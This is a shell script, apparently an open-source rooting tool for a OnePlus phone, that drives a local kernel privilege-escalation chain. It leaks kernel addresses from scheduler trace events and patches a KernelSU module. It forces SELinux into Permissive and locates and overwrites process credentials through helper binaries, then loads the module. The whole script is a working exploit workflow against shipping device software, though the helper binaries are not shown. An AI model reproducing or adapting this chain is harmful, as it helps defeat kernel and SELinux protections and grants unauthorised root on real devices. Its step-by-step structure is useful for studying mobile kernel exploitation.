#!/system/bin/sh
# 一加16提权越狱 · 核心流程（星苒鸭 · github.com/xingranya）
# 只负责：采集事件 → 校准地址 → 内核补丁 → 安全策略 → 凭证定位 → 加载内核模块。
W=${ONEKEY_WORK:-/data/local/tmp/onekey-work}
M=${ONEKEY_MANAGER:-kernelsu}
cd "$W" || { echo "@WARN=工作目录不存在"; echo "@EXIT=90"; exit 90; }
if [ -n "$ONEKEY_LKM" ]; then
  LKM="$ONEKEY_LKM"
else
  case "$M" in
    next) LKM=next.ko ;;
    bakasu) LKM=bakasu.ko ;;
    sukisu) LKM=sukisu.ko ;;
    finasu) LKM=finasu.ko ;;
    *) LKM=official.ko ;;
  esac
fi
log() { echo "$*"; }
warn() { echo "@WARN=$*"; }
stage() { echo "@STAGE=$*"; }
CAT_PIDS=""
PERM_PID=""
CRED_PID=""
WRITER_PID=""
kill_wait() {
    p=$1
    [ -n "$p" ] || return 0
    kill -9 "$p" 2>/dev/null
    # 内核加载阶段进程可能处于 D 状态，wait 会永久阻塞；这里只做有界确认，不 wait。
    i=0
    while kill -0 "$p" 2>/dev/null && [ $i -lt 10 ]; do
        sleep 0.2
        i=$((i+1))
    done
    [ $i -ge 10 ] && echo "@WARN=进程 $p 未在 2 秒内退出，已跳过等待"
    return 0
}
cleanup() {
    for p in $CAT_PIDS $PERM_PID $CRED_PID $WRITER_PID; do kill_wait "$p"; done
    CAT_PIDS=""
    PERM_PID=""
    CRED_PID=""
    WRITER_PID=""
    true
}
trap cleanup EXIT INT TERM HUP
capture_events() {
    CAPTURE_N=$(( ${CAPTURE_N:-0} + 1 ))
    P="bl_try${CAPTURE_N}_"
    stage cap
    log "采集内核事件（第 $CAPTURE_N 轮，约 60 秒）"

    for p in $CAT_PIDS; do kill_wait "$p"; done
    CAT_PIDS=""
    pkill -f trace_pipe_raw 2>/dev/null
    sleep 1
    # 读文本 trace 必须在关闭 tracing 之前。
    echo 0 > /sys/kernel/tracing/tracing_on 2>/dev/null
    echo 0 > /sys/kernel/tracing/events/sched/sched_blocked_reason/enable 2>/dev/null
    echo 0 > /sys/kernel/tracing/trace 2>/dev/null
    : > /sys/kernel/tracing/trace 2>/dev/null
    rm -f bl_*.bin bl_*_text.txt bl_text.txt target.txt slide.txt loaded.ko
    rm -f ${P}*.bin ${P}text.txt 2>/dev/null

    # 先启用事件和 tracing，再启动 raw 采集。
    echo 1 > /sys/kernel/tracing/events/sched/sched_blocked_reason/enable 2>/dev/null
    echo 1 > /sys/kernel/tracing/tracing_on 2>/dev/null
    for raw in /sys/kernel/tracing/per_cpu/cpu*/trace_pipe_raw; do
        [ -e "$raw" ] || continue
        c=${raw#/sys/kernel/tracing/per_cpu/cpu}
        c=${c%%/*}
        case "$c" in ''|*[!0-9]*) continue ;; esac
        cat "$raw" > "${P}${c}.bin" 2>/dev/null &
        CAT_PIDS="$CAT_PIDS $!"
    done
    [ -n "$CAT_PIDS" ] || warn "未找到内核事件采集通道"
    sleep 1
    i=0
    while [ $i -lt 300 ]; do
        ./loadgen.bin 2 30 >/dev/null 2>&1
        i=$((i+1))
        [ $((i % 25)) -eq 0 ] && echo "@TICK=capture $i"
    done

    # 读文本 trace 必须在关闭 tracing 之前。
    grep "sched_blocked_reason" /sys/kernel/tracing/trace > "${P}text.txt" 2>/dev/null
    echo 0 > /sys/kernel/tracing/tracing_on 2>/dev/null
    echo 0 > /sys/kernel/tracing/events/sched/sched_blocked_reason/enable 2>/dev/null
    sleep 1
    for p in $CAT_PIDS; do kill_wait "$p"; done
    CAT_PIDS=""
    pkill -f trace_pipe_raw 2>/dev/null
    sleep 1

    lines=$(wc -l < "${P}text.txt" 2>/dev/null || echo 0)
    bytes=$(cat ${P}*.bin 2>/dev/null | wc -c)
    log "采集完成：text=$lines 行，raw=$bytes 字节"

    for f in ${P}*.bin; do
        [ -e "$f" ] || continue
        b=${f#${P}}
        mv -f "$f" "bl_$b" 2>/dev/null
    done
    mv -f "${P}text.txt" bl_text.txt 2>/dev/null
    log "采集完成"
}
run_resolve() {
    rm -f target.txt slide.txt
    RES_OUT=$(timeout 120 ./resolve.bin "$W" symbols.txt 2>&1)
    RES_RC=$?
    echo "$RES_OUT"
    RES_ANCHORS=$(printf '%s' "$RES_OUT" | sed -n 's/.*anchors=\([0-9][0-9]*\).*/\1/p' | tail -1)
    RES_OBSERVED=$(printf '%s' "$RES_OUT" | sed -n 's/.*observed=\([0-9][0-9]*\).*/\1/p' | tail -1)
    RES_BAD=0
    if [ "$RES_RC" != 0 ]; then
        if [ -z "$RES_ANCHORS" ] || [ "$RES_ANCHORS" -lt 4 ] 2>/dev/null; then
            RES_BAD=1
        fi
        if [ -n "$RES_OBSERVED" ] && [ "$RES_OBSERVED" -gt 500000 ] 2>/dev/null; then
            RES_BAD=1
        fi
    fi
    return $RES_RC
}

capture_events
stage solve
echo "@TICK=solve start"
run_resolve
rc=$?
if [ "$rc" != 0 ] || [ "$RES_BAD" = 1 ]; then
    warn "地址校准未通过（rc=$rc anchors=$RES_ANCHORS observed=$RES_OBSERVED）；重新采集一次干净 trace"
    capture_events
    stage solve
    echo "@TICK=solve retry"
    run_resolve
    rc=$?
fi
[ "$rc" = 124 ] && warn "地址校准超时"
if [ "$rc" != 0 ] || [ "$RES_BAD" = 1 ]; then
    if [ "$RES_BAD" = 1 ]; then
        warn "采集数据异常：anchors=$RES_ANCHORS observed=$RES_OBSERVED；已停止，不再使用脏数据"
    else
        warn "地址校准失败 rc=$rc anchors=$RES_ANCHORS observed=$RES_OBSERVED"
    fi
    echo "@EXIT=11"
    exit 11
fi
TARGET=$(cat target.txt 2>/dev/null)
[ -n "$TARGET" ] || { warn "未得到目标地址"; echo "@EXIT=12"; exit 12; }
log "地址校准完成"
stage patch
echo "@TICK=patch start"
timeout 120 ./patch.bin "$LKM" symbols.txt "$(cat slide.txt)" loaded.ko
rc=$?
[ "$rc" = 124 ] && warn "内核补丁超时"
[ "$rc" = 0 ] || { warn "内核补丁失败 rc=$rc"; echo "@EXIT=13"; exit 13; }
cp -f loaded.ko /data/local/tmp/ksu-official.ko || { warn "内核文件投放失败"; echo "@EXIT=14"; exit 14; }
log "内核补丁完成"
stage permissive
if [ "$(getenforce 2>/dev/null)" = "Permissive" ]; then
    log "当前已是 Permissive，跳过安全策略切换"
else
./perm.bin 0 "$TARGET" 180 400 16 6000 12000 4500 >perm.log 2>&1 &
PERM_PID=$!
i=0
while [ $i -lt 480 ]; do
    [ "$(getenforce 2>/dev/null)" = "Permissive" ] && break
    sleep 1
    i=$((i+1))
    if [ $((i % 30)) -eq 0 ]; then
        echo "@TICK=permissive $((i))s"
        tail -n 2 perm.log 2>/dev/null | sed 's/^/  perm: /'
    fi
done
if [ "$(getenforce 2>/dev/null)" != "Permissive" ]; then
    kill_wait "$PERM_PID"
    PERM_PID=""
    warn "安全策略切换失败"
    echo "@EXIT=15"
    exit 15
fi
kill_wait "$PERM_PID"
PERM_PID=""
log "安全策略就绪"
fi
stage inject
rm -f cred.log
./cred.bin --target >cred.log 2>&1 &
CRED_PID=$!
CRED=""
i=0
while [ $i -lt 120 ]; do
    CRED=$(grep -o 'TARGET_CRED 0x[0-9a-f]*' cred.log 2>/dev/null | awk '{print $2}')
    [ -n "$CRED" ] && break
    sleep 1
    i=$((i+1))
    if [ $((i % 15)) -eq 0 ]; then
        echo "@TICK=cred $i"
        tail -n 2 cred.log 2>/dev/null | sed 's/^/  cred: /'
    fi
done
if [ -z "$CRED" ]; then
    kill_wait "$CRED_PID"
    CRED_PID=""
    warn "凭证定位失败"
    echo "@EXIT=16"
    exit 16
fi
log "凭证已定位"
stage load
# 不碰 com.oplus.exsystemservice：截屏组件必须保持可用。
./writer.bin "$CRED" 90 90 400 16 6000 12000 >writer.log 2>&1 &
WRITER_PID=$!
i=0
while [ $i -lt 720 ]; do
    grep -q LOADED_SLEEP cred.log 2>/dev/null && break
    grep -qi kernelsu /proc/modules 2>/dev/null && break
    sleep 1
    i=$((i+1))
    if [ $((i % 30)) -eq 0 ]; then
        echo "@TICK=load $((i))s"
        tail -n 2 writer.log 2>/dev/null | sed 's/^/  writer: /'
        tail -n 1 cred.log 2>/dev/null | sed 's/^/  cred: /'
    fi
done
if ! grep -qi kernelsu /proc/modules 2>/dev/null; then
    kill_wait "$WRITER_PID"
    WRITER_PID=""
    kill_wait "$CRED_PID"
    CRED_PID=""
    warn "内核模块加载失败"
    echo "@EXIT=17"
    exit 17
fi
kill_wait "$WRITER_PID"
WRITER_PID=""
kill_wait "$CRED_PID"
CRED_PID=""
grep -i kernelsu /proc/modules 2>/dev/null | sed 's/^/  module: /'
log "内核模块已加载"
echo "@EXIT=0"
exit 0
